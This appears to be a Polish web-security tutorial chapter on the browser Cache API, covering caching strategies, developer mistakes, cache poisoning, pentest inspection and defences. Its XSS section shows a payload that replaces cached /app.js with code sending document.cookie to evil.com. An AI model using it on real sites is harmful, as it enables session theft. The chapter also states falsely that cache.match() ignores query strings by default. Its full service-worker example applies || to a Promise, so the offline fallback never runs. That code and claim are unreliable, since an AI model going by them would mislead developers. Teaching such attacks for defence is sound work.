# Rozdział 18: Cache API

## 1. Czym jest Cache API

**Cache API** to interfejs przeglądarki umożliwiający programistyczne kontrolowanie cache'owania par `Request → Response`. Jest to mechanizm przechowywania odpowiedzi HTTP po stronie klienta, zaprojektowany przede wszystkim do użycia w kontekście **Service Workers**, choć dostępny również w kontekście okna (`window.caches`).

Kluczowe cechy:
- Przechowuje pełne obiekty `Request` i `Response` (nagłówki, ciało, status)
- Asynchroniczne API oparte na Promises
- Persystentne między sesjami (dane przeżywają restart przeglądarki)
- Kontrolowane programistycznie — aplikacja decyduje co, kiedy i jak długo cache'ować
- Izolowane per-origin

Cache API jest fundamentem dla strategii **offline-first** w PWA: aplikacja może serwować zasoby bezpośrednio z cache'u, gdy urządzenie jest offline lub sieć jest wolna.

---

## 2. Dlaczego powstał

### Problem: brak kontroli nad HTTP cache

Tradycyjny HTTP cache (zarządzany przez przeglądarkę i nagłówki jak `Cache-Control`, `ETag`, `Expires`) jest **opaque** — deweloper nie ma programistycznej kontroli nad tym co jest w cache, kiedy jest odświeżane ani jak obsłużyć offline.

Cache API daje pełną kontrolę:
- Które requesty są cache'owane
- Które wersje zasobów
- Kiedy cache jest inwalidowany
- Jak obsłużyć requesty offline (serve from cache vs network fallback)

### Związek z Service Workers

Service Workers (SW) interceptują requesty sieciowe. Cache API to magazyn, z którego SW może serwować odpowiedzi zamiast sieci. Razem tworzą offline capability:

```
Przeglądarka → [Service Worker] → Network
                     ↕
                 Cache API
```

Bez Cache API, Service Worker miałby interceptować requesty ale nie miałby gdzie przechowywać odpowiedzi do offline servingu.

---

## 3. Jak działa

### Model danych

Cache API organizuje dane jako:
- **CacheStorage** — kontener najwyższego poziomu (dostępny przez `caches`)
- **Cache** — nazwana kolekcja par Request/Response
- **Request** — obiekt HTTP request (URL, metoda, nagłówki)
- **Response** — obiekt HTTP response (status, nagłówki, ciało jako ReadableStream)

```
caches (CacheStorage)
  ├── "v1" (Cache)
  │     ├── GET /index.html → Response(200, "<!DOCTYPE...")
  │     ├── GET /app.js    → Response(200, "const app...")
  │     └── GET /style.css → Response(200, "body {...")
  │
  └── "v2" (Cache) — nowa wersja
        ├── GET /index.html → Response(200, "<!DOCTYPE...") // zaktualizowany
        └── GET /app.js    → Response(200, "const app...") // nowy
```

### API

```javascript
// Otwórz (lub utwórz) cache
const cache = await caches.open('my-cache-v1');

// Dodaj response do cache
await cache.add('/index.html');       // pobiera i cache'uje
await cache.addAll(['/app.js', '/style.css']); // batch

// Ręcznie dodaj response (kontrola nagłówków)
const response = await fetch('/api/data');
await cache.put('/api/data', response);

// Pobierz z cache
const cached = await cache.match('/index.html');
const cached2 = await caches.match('/index.html'); // szuka we wszystkich cache'ach

// Sprawdź czy istnieje cache
const exists = await caches.has('my-cache-v1');

// Lista cache'ów
const cacheNames = await caches.keys();

// Usuń cache
await caches.delete('my-cache-v1');

// Usuń konkretny request z cache
await cache.delete('/old-resource.js');

// Znajdź wszystkie matching
const matches = await cache.matchAll('/api/data');
```

### Strategie cache'owania (Service Worker patterns)

**Cache First** — idealna dla statycznych zasobów:
```javascript
// cache first → network fallback
async function cacheFirst(request) {
    const cached = await caches.match(request);
    if (cached) return cached;
    const response = await fetch(request);
    const cache = await caches.open('v1');
    cache.put(request, response.clone());
    return response;
}
```

**Network First** — idealna dla dynamicznych danych z offline fallback:
```javascript
async function networkFirst(request) {
    try {
        const response = await fetch(request);
        const cache = await caches.open('v1');
        cache.put(request, response.clone());
        return response;
    } catch {
        return caches.match(request); // fallback do cache
    }
}
```

**Stale While Revalidate** — serwuje szybko z cache, aktualizuje w tle:
```javascript
async function staleWhileRevalidate(request) {
    const cache = await caches.open('v1');
    const cached = await cache.match(request);
    
    const networkPromise = fetch(request).then(response => {
        cache.put(request, response.clone());
        return response;
    });
    
    return cached || networkPromise; // natychmiastowy, potem aktualizacja
}
```

---

## 4. Co dzieje się wewnętrznie

### Przechowywanie

Cache API przechowuje dane na dysku. W Chrome — w katalogu profilu, podobnie jak IndexedDB. Ciało Response jest przechowywane jako blob.

### Klonowanie Response

**Krytyczny szczegół:** `Response.body` to `ReadableStream` — można go odczytać tylko raz. Jeśli chcesz zarówno cache'ować jak i zwrócić response, musisz go sklonować:

```javascript
const response = await fetch(request);
const clone = response.clone(); // klon dla cache
await cache.put(request, clone);
return response; // oryginał do przeglądarki

// Błąd bez clone:
await cache.put(request, response); // zużywa stream
return response; // puste ciało!
```

### Matching i warianty

`cache.match()` domyślnie ignoruje query string dla dopasowania jeśli URL się zgadza. Opcje:

```javascript
cache.match(request, {
    ignoreSearch: true,  // ignoruj query string
    ignoreMethod: true,  // ignoruj metodę HTTP
    ignoreVary: true     // ignoruj nagłówek Vary
});
```

---

## 5. Analogiczny przykład z życia

Cache API to biblioteczna czytelnia z wypożyczalnią:

- Biblioteka (Cache API) trzyma kopie książek (Response objects)
- Każda półka (Cache) ma nazwę i zawiera zbiór tytułów (Request/Response pairs)
- Bibliotekarz (Service Worker) sprawdza najpierw czy mają egzemplarz na miejscu (cache.match)
- Jeśli nie — zamawia z magazynu (fetch z sieci) i odkłada kopię dla następnych
- Różne wydania (wersje cache) mogą być na różnych półkach (cache v1, v2)

---

## 6. Przykład kodu

```javascript
// === Service Worker z pełną strategią cache ===
const CACHE_NAME = 'app-v1';
const STATIC_ASSETS = [
    '/',
    '/index.html',
    '/app.js',
    '/style.css',
    '/offline.html'
];

// Install — precache statycznych zasobów
self.addEventListener('install', (event) => {
    event.waitUntil(
        caches.open(CACHE_NAME).then(cache => {
            return cache.addAll(STATIC_ASSETS);
        }).then(() => self.skipWaiting()) // aktywuj natychmiast
    );
});

// Activate — usuń stare cache'e
self.addEventListener('activate', (event) => {
    event.waitUntil(
        caches.keys().then(cacheNames => {
            return Promise.all(
                cacheNames
                    .filter(name => name !== CACHE_NAME)
                    .map(name => caches.delete(name))
            );
        }).then(() => self.clients.claim())
    );
});

// Fetch — obsługa requestów z cache
self.addEventListener('fetch', (event) => {
    const { request } = event;
    const url = new URL(request.url);
    
    // API calls — network first
    if (url.pathname.startsWith('/api/')) {
        event.respondWith(networkFirst(request));
        return;
    }
    
    // Statyczne zasoby — cache first
    event.respondWith(cacheFirst(request));
});

async function cacheFirst(request) {
    const cached = await caches.match(request);
    if (cached) return cached;
    
    try {
        const response = await fetch(request);
        if (response.ok) {
            const cache = await caches.open(CACHE_NAME);
            cache.put(request, response.clone());
        }
        return response;
    } catch {
        // Offline — zwróć stronę offline
        return caches.match('/offline.html');
    }
}

async function networkFirst(request) {
    try {
        const response = await fetch(request);
        const cache = await caches.open(CACHE_NAME);
        cache.put(request, response.clone());
        return response;
    } catch {
        return caches.match(request) || new Response(
            JSON.stringify({ error: 'offline' }),
            { headers: { 'Content-Type': 'application/json' } }
        );
    }
}
```

---

## 7. Przykład z prawdziwej aplikacji

### Cache poisoning przez SW

Opisany dokładniej w rozdziale 19 (Service Workers), ale mechanizm dotyczy Cache API:

```javascript
// Aplikacja SW która cache'uje odpowiedź bez walidacji
self.addEventListener('fetch', event => {
    event.respondWith(
        fetch(event.request).then(response => {
            // BŁĄD: cache'uje każdą odpowiedź — nawet błędną lub zmanipulowaną
            caches.open('v1').then(c => c.put(event.request, response.clone()));
            return response;
        })
    );
});

// Jeśli MITM lub serwer zwróci poisoned response:
// 1. SW ją cache'uje
// 2. Każde kolejne żądanie — serwuje poisoned response z cache
// 3. Nawet po usunięciu podatności — cache zostaje
```

### Inwalidacja po wylogowaniu

```javascript
// Aplikacja powinna czyścić cache przy wylogowaniu
async function logout() {
    // Usuń dane użytkownika z cache
    const cache = await caches.open('app-v1');
    
    // Usuń spersonalizowane requesty
    await Promise.all([
        cache.delete('/api/user/profile'),
        cache.delete('/api/user/settings'),
        cache.delete('/api/dashboard')
    ]);
    
    // Lub usuń cały cache (bezpieczniej)
    const keys = await caches.keys();
    await Promise.all(keys.map(k => caches.delete(k)));
    
    sessionStorage.clear();
    localStorage.clear();
    window.location.href = '/login';
}
```

---

## 8. Typowe błędy programistów

### Błąd 1: Cache'owanie odpowiedzi bez sprawdzenia statusu

```javascript
// BŁĄD: cache'uje też błędy (404, 500)
const response = await fetch(request);
await cache.put(request, response.clone()); // zapisuje 404!

// POPRAWKA: tylko 200 OK
const response = await fetch(request);
if (response.status === 200) {
    await cache.put(request, response.clone());
}
```

### Błąd 2: Brak wersjonowania cache

```javascript
// BŁĄD: zawsze 'app-cache' — stara wersja nigdy nie inwalidowana
caches.open('app-cache').then(cache => cache.addAll(assets));

// POPRAWKA: wersjonowane nazwy + czyszczenie starych w activate
const VERSION = 'v2024-11-15';
const CACHE_NAME = `app-${VERSION}`;
// W activate event: usuń wszystko co != CACHE_NAME
```

### Błąd 3: Cache'owanie authenticated endpoints

```javascript
// BŁĄD: cache'ujesz odpowiedź API która zawiera dane innego użytkownika
event.respondWith(
    caches.match(request) || fetch(request).then(r => {
        cache.put(request, r.clone());
        return r;
    })
);
// /api/user/profile może zwrócić dane User A, zostać cache'owane,
// a User B dostanie te same dane z cache!

// POPRAWKA: nie cache'uj authenticated endpoints
// lub dodaj user-specific URL: /api/user/profile?uid=123
```

---

## 9. Znaczenie dla bezpieczeństwa

### Cache Poisoning

Jeśli Service Worker cache'uje response zmanipulowany przez MITM (brak HTTPS), poisoned URL lub redirect — ta odpowiedź może być serwowana użytkownikom przez długi czas.

**Wektor:**
1. Brak HTTPS → MITM może podmienić response dla `/app.js`
2. SW cache'uje poisoned `app.js`
3. Każdy kolejny użytkownik otrzymuje malicious `app.js` z cache
4. Nawet po naprawieniu serwera — cache pozostaje do ręcznego usunięcia

### XSS przez Cache API

Cache API jest dostępne z `window.caches` — XSS może to wykorzystać:

```javascript
// XSS może zmodyfikować cache
async function poisonCache() {
    const cache = await caches.open('app-v1');
    const maliciousResponse = new Response(
        'fetch("https://evil.com/c2?" + document.cookie)',
        { headers: { 'Content-Type': 'application/javascript' } }
    );
    // Podmiena cached /app.js na malicious wersję
    await cache.put('/app.js', maliciousResponse);
}
// Każdy kolejny ładunek strony serwuje malicious /app.js z cache
```

To jest szczególnie groźne bo:
- Atak persystuje po naprawieniu XSS
- Inne karty mogą dostać poisoned cache
- Service Worker serwuje cache nawet gdy serwer jest offline

### Powiązane CWE

- **CWE-525** — Information Exposure Through Browser Caching
- **CWE-494** — Download of Code Without Integrity Check (poisoned cache)
- **CWE-79** — XSS (wektor dostępu do Cache API)

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Application → Cache Storage

1. **Application** → **Cache Storage** → rozwiń origin
2. Widoczne są wszystkie nazwy cache'ów
3. Kliknij na cache → lista request/response pairs
4. Kliknij na konkretny request → podgląd nagłówków i ciała response

### Console

```javascript
// Lista wszystkich cache'ów
await caches.keys();
// → ["app-v1", "workbox-precache-v2-...", ...]

// Zawartość konkretnego cache
const cache = await caches.open('app-v1');
const requests = await cache.keys();
requests.forEach(r => console.log(r.url));

// Sprawdź czy URL jest cache'owany
const match = await caches.match('/api/user/profile');
if (match) {
    const data = await match.json();
    console.log('Cached user data:', data);
}

// Podejrzyj zawartość cached response
const r = await caches.match('/app.js');
console.log(await r.text());
```

### Co szukamy

- Authenticated API responses zawierające PII lub tokeny
- Wrażliwe dane w cached payloadach
- Brak nagłówka `Vary: Cookie` lub `Vary: Authorization` dla user-specific endpointów
- Brak inwalidacji cache po wylogowaniu
- Cache cache'uje odpowiedzi błędów (można odkryć stack traces)

---

## 11. Jak testować bezpieczeństwo

```
□ Czy Cache API zawiera odpowiedzi z wrażliwymi danymi?
□ Czy authenticated endpoints są cache'owane (risk cross-user data)?
□ Czy cache jest czyszczony przy wylogowaniu?
□ Czy aplikacja używa HTTPS (zapobiega MITM cache poisoning)?
□ Czy XSS może nadpisać cache kluczowych zasobów JS?
□ Czy cache'owane JS pliki mają poprawne integrity checksums (SRI)?
□ Czy inwalidacja cache działa przy aktualizacji aplikacji?
□ Czy odpowiedzi błędów (400/500 z stack traces) nie są cache'owane?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz: Persistent XSS przez Cache API

**Warunki:** Aplikacja ma XSS (choćby reflective), Service Worker cache'uje JS.

```
1. Atakujący wywołuje XSS → uzyskuje chwilowe wykonanie kodu
2. XSS podaje malicious /app.js do Cache API
3. Service Worker servuje poisoned /app.js przy każdym reloadzie
4. Nawet po naprawieniu XSS na serwerze — cache pozostaje
5. Ofiara musi ręcznie wyczyścić cache lub poczekać na nowy SW
```

### Scenariusz: Cross-user data leak przez cached API

```
1. User A loguje się → /api/dashboard zwraca jego dane
2. SW cache'uje GET /api/dashboard bez Vary: Cookie
3. User A wylogowuje się
4. User B loguje się na tym samym urządzeniu
5. /api/dashboard → SW serwuje cache → User B widzi dane User A!
```

---

## 13. Jak się zabezpieczać

```javascript
// 1. Nigdy nie cache'uj authenticated endpoints naiwnie
const NEVER_CACHE = [
    '/api/user/', 
    '/api/admin/',
    '/api/dashboard'
];

self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    if (NEVER_CACHE.some(p => url.pathname.startsWith(p))) {
        event.respondWith(fetch(event.request)); // always network
        return;
    }
    event.respondWith(cacheFirst(event.request));
});

// 2. Waliduj response przed cache'owaniem
async function safePut(cache, request, response) {
    if (response.status !== 200) return response; // nie cache'uj błędów
    if (response.headers.get('Cache-Control')?.includes('no-store')) return response;
    await cache.put(request, response.clone());
    return response;
}

// 3. Czyść cache przy wylogowaniu
async function logout() {
    const keys = await caches.keys();
    await Promise.all(keys.map(k => caches.delete(k)));
    // ...
}

// 4. Używaj HTTPS i Content-Security-Policy
// Zapobiega MITM cache poisoning i XSS cache manipulation
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. Cache API = programistyczny HTTP cache, przechowuje pary Request/Response
2. Zaprojektowany dla Service Workers — offline-first PWA
3. Persystentny między sesjami, izolowany per-origin
4. Dostępny z `window.caches` — XSS ma do niego dostęp
5. Główne zagrożenia: cache poisoning, cross-user data leak, persistent XSS

**Dla pentestera:**
- **Application → Cache Storage** w DevTools — przeglądaj zawartość
- Sprawdź czy auth endpoints są cache'owane
- Sprawdź co zostaje w cache po wylogowaniu
- XSS + Cache API = możliwość persistent attack

---

## Powiązania

```
Cache API
    │
    ├──► Service Workers (Rozdział 19)
    │         SW interceptuje requesty i używa Cache API do offline serving
    │
    ├──► Fetch API (Rozdział 11)
    │         Cache API przechowuje Response objects z fetch()
    │
    ├──► IndexedDB (Rozdział 17)
    │         Często używane razem — Cache API dla assets, IndexedDB dla danych
    │
    └──► HTTP Cache (poza scope tego poradnika)
              Cache API nadpisuje lub uzupełnia standardowy HTTP cache
```
